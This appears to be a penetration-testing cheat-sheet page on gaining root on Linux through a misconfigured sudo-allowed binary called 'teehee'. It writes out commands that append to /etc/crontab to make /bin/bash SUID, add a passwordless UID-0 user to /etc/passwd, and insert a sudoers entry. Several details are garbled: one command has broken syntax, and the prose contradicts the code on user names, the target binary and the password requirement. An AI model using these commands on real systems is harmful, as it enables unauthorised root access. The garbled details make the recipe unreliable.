# STDIN/STDOUT

if we can copy stdin to a file and to stdout we can use these techniques to gain root privilege on linux. this can be done with a vulnerable binary that doesn't correctly handle I/O.

## <mark style="color:red;">Scenario #1</mark>

add an entry to the “/etc/crontab” file which is executed every minute to change the permissions fro the “/bin/sh” binary to be 4777 which means SUID.

```
echo "* * * * * root chmod 4777 /bin/bash" | sudo >>>>  /etc/crontab
```

if the vulnerable binry file is called teehee, we will have something like this:

```
echo "* * * * * root chmod 4777 /bin/bash" | sudo teehee -a /etc/crontab
/bin/bash
```

this means that the vulnerable binary run the echo command and add the line to /etc/crontab which will run every minute and gives us full access to /bin/bash as root

## <mark style="color:red;">Scenario #2</mark>

adding an entry the /etc/passwd file for a new user called “hackingresources” with the same uid (User ID) and gid (Group ID) as root user and this user has no password.

```
echo "root2::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
su root2
```

again we are using the same vulnerability with a different method.

## <mark style="color:red;">Scenario #3</mark>

by adding an entry to the /etc/sudoers file which will allow jim user to run all the commands as root without the need for the password.

```
echo " username ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers 
username$ sudo /bin/bash
```
